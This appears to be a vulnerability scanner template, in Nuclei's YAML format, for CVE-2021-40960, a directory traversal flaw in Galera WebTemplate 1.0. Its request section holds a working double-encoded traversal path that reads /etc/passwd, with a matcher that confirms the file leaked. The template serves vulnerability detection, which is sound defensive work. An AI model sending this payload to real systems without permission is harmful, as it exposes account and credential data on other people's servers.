id: CVE-2021-40960
info:
  name: Galera WebTemplate 1.0 Directory Traversal
  author: daffainfo
  severity: critical
  description: Galera WebTemplate 1.0 is vulnerable to directory traversal, potentially
    exposing sensitive information from /etc/passwd and /etc/shadow, as indicated
    by CVE-2021-40960.
  reference:
  - http://www.omrylmz.com/galera-webtemplate-1-0-directory-traversal-vulnerability-cve-2021-40960/
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40960
  - http://www.galera.com.tr/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-40960
    cwe-id: CWE-22
  tags: cve,cve2021,lfi
  metadata:
    impact: The impact of the Galera WebTemplate 1.0 directory traversal vulnerability
      (CVE-2021-40960) is that sensitive information such as usernames and encrypted
      passwords stored in /etc/passwd and /etc/shadow can be accessed by unauthorized
      users.
    recommendation: I highly recommend updating Galera WebTemplate 1.0 to patch CVE-2021-40960
      and prevent exploitation of the directory traversal vulnerability.
requests:
- method: GET
  path:
  - '{{BaseURL}}/GallerySite/filesrc/fotoilan/388/middle//.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd'
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
